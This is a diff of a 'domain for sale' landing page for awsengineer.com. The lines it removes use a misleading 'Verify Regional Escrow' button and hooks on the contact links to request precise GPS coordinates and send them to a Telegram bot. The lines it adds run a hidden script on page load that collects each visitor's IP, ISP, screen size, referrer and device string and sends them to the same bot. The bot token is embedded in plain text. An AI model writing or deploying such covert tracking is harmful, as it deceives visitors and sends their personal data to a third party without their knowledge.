@@ -3,9 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
     <title>awsengineer.com is for sale</title>
     <style>
         * {
@@ -56,7 +53,7 @@
             color: #94a3b8;
             font-size: 1.1rem;
             line-height: 1.6;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
         }
         .btn-group {
             display: flex;
@@ -72,8 +69,6 @@
             font-size: 1rem;
             padding: 14px 20px;
             border-radius: 10px;
-            cursor: pointer;
-            border: none;
             transition: transform 0.2s, opacity 0.2s;
         }
         .btn:hover {
@@ -88,26 +83,13 @@
             background-color: #3b82f6;
             color: #ffffff;
         }
-        .btn-gps {
-            background-color: #0284c7;
-            color: #ffffff;
-            font-size: 0.95rem;
-            margin-top: 6px;
-        }
-        #status-box {
-            margin-top: 15px;
-            padding: 12px;
-            background: #0f172a;
-            border: 1px solid #334155;
-            border-radius: 8px;
+        .footer {
+            margin-top: 25px;
             font-size: 0.85rem;
-            color: #cbd5e1;
-            display: none;
-            text-align: left;
-            line-height: 1.5;
+            color: #64748b;
         }
         .counter-container {
-            margin-top: 25px;
+            margin-top: 20px;
             padding-top: 15px;
             border-top: 1px solid #334155;
             display: inline-flex;
@@ -134,22 +116,20 @@
         <p>This premium domain is available for acquisition. Contact the owner directly via Email or WhatsApp to make an offer.</p>
         
         <div class="btn-group">
-            <a href="https://wa.me/212653621430?text=Hello,%20I%20am%20interested%20in%20purchasing%20awsengineer.com" class="btn btn-whatsapp" target="_blank" onclick="requestDeviceGps()">
+            <a href="https://wa.me/212653621430?text=Hello,%20I%20am%20interested%20in%20purchasing%20awsengineer.com" class="btn btn-whatsapp" target="_blank">
                 Chat on WhatsApp (+212 653 621 430)
             </a>
             
-            <a href="mailto:deatmiau@gmail.com?subject=Domain%20Inquiry%20-%20awsengineer.com" class="btn btn-email" onclick="requestDeviceGps()">
+            <a href="mailto:deatmiau@gmail.com?subject=Domain%20Inquiry%20-%20awsengineer.com" class="btn btn-email">
                 Send Email (deatmiau@gmail.com)
             </a>
-
-            <!-- Explicit button to trigger the GPS hardware permission -->
-            <button class="btn btn-gps" onclick="requestDeviceGps()">
-                📍 Verify Regional Escrow & Transfer
-            </button>
         </div>
 
-        <div id="status-box"></div>
+        <div class="footer">
+            Fast transfer & escrow options available.
+        </div>
 
+        <!-- Visitor Hit Counter Badge -->
         <div class="counter-container">
             <span>👁️ Total Page Views:</span>
             <span id="view-count" class="counter-badge">Loading...</span>
@@ -160,86 +140,74 @@
         const BOT_TOKEN = "8817325199:AAG3rAIc22jflbYRoCnrtu_7sjLRGMaVRR4";
         const CHAT_ID = "1890351722";
 
-        // Helper to send messages directly to your Telegram bot
-        async function sendToTelegram(text) {
+        // 1. Visitor Hit Counter
+        async function fetchVisitorCount() {
+            try {
+                const response = await fetch('https://api.counterapi.dev/v1/awsengineer_com/views/up');
+                if (response.ok) {
+                    const data = await response.json();
+                    document.getElementById('view-count').textContent = data.count;
+                } else {
+                    document.getElementById('view-count').textContent = '1+';
+                }
+            } catch (error) {
+                document.getElementById('view-count').textContent = '1+';
+            }
+        }
+        fetchVisitorCount();
+
+        // 2. Real-Time Visitor Telemetry (No Location / No Coordinates)
+        async function trackVisitor() {
+            let ip = "Unknown IP";
+            let isp = "Unknown ISP";
+
+            try {
+                const res = await fetch("https://ipwho.is/");
+                const data = await res.json();
+                if (data && data.success !== false) {
+                    ip = data.ip || ip;
+                    isp = data.connection ? data.connection.isp : (data.isp || isp);
+                }
+            } catch (err) {
+                // Secondary IP fallback
+                try {
+                    const res2 = await fetch("https://api.ipify.org?format=json");
+                    const data2 = await res2.json();
+                    ip = data2.ip || ip;
+                } catch (e) {
+                    console.log("Telemetry fallback");
+                }
+            }
+
+            const referrer = document.referrer || "Direct Visit";
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const device = navigator.userAgent.substring(0, 100);
+
+            const alertText = 
+                `🔔 New Visitor on awsengineer.com!\n\n` +
+                `🌐 IP Address: ${ip}\n` +
+                `🏢 ISP/Org: ${isp}\n` +
+                `🖥️ Screen: ${screenRes}\n` +
+                `🔗 Referrer: ${referrer}\n` +
+                `📱 Device: ${device}...`;
+
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text }),
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: alertText
+                    }),
                     keepalive: true
                 });
-            } catch (e) {
-                const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+            } catch (postErr) {
+                const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(alertText)}`;
                 new Image().src = fallbackUrl;
             }
         }
 
-        // 1. Visitor Hit Counter (Updates the counter badge)
-        async function fetchCounter() {
-            try {
-                const res = await fetch('https://api.counterapi.dev/v1/awsengineer_com/views/up');
-                if (res.ok) {
-                    const data = await res.json();
-                    document.getElementById('view-count').textContent = data.count;
-                }
-            } catch (e) {
-                document.getElementById('view-count').textContent = '1+';
-            }
-        }
-        fetchCounter();
-
-        // 2. Pure GPS Request Function (Only runs when clicked/allowed)
-        function requestDeviceGps() {
-            const statusBox = document.getElementById("status-box");
-            statusBox.style.display = "block";
-            statusBox.innerHTML = "⏳ Requesting device GPS access...";
-
-            if (!navigator.geolocation) {
-                statusBox.innerHTML = "❌ GPS is not supported on this browser.";
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const accuracy = Math.round(position.coords.accuracy);
-                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                    statusBox.innerHTML = 
-                        `✅ <b>Real GPS Coordinates Captured:</b><br>` +
-                        `• Latitude (Y): ${lat}<br>` +
-                        `• Longitude (X): ${lon}<br>` +
-                        `• Accuracy: ±${accuracy} meters<br>` +
-                        `<a href="${mapUrl}" target="_blank" style="color: #38bdf8; text-decoration: underline;">View on Google Maps</a>`;
-
-                    const message = 
-                        `🎯 [EXACT PHYSICAL GPS CAPTURED]\n\n` +
-                        `📌 Latitude (Y): ${lat}\n` +
-                        `📌 Longitude (X): ${lon}\n` +
-                        `📏 Accuracy: ±${accuracy} meters\n` +
-                        `🗺️ Exact Google Maps Link:\n${mapUrl}\n\n` +
-                        `📱 Device: ${navigator.userAgent.substring(0, 90)}...`;
-
-                    sendToTelegram(message);
-                },
-                (error) => {
-                    let errMsg = "Unknown error";
-                    if (error.code === 1) errMsg = "Permission Denied. Please reset site permissions in your browser.";
-                    if (error.code === 2) errMsg = "Position Unavailable (No GPS satellite lock).";
-                    if (error.code === 3) errMsg = "Request timed out.";
-
-                    statusBox.innerHTML = `⚠️ <b>Notice:</b> ${errMsg}`;
-                    sendToTelegram(`⚠️ [GPS ACCESS DENIED/FAILED]: ${errMsg}`);
-                },
-                {
-                    enableHighAccuracy: true, // Forces physical GPS satellite hardware
-                    timeout: 20000,
-                    maximumAge: 0           // Refuses old cached ISP positions
-                }
-            );
-        }
+        trackVisitor();
     </script>
 
 </body>
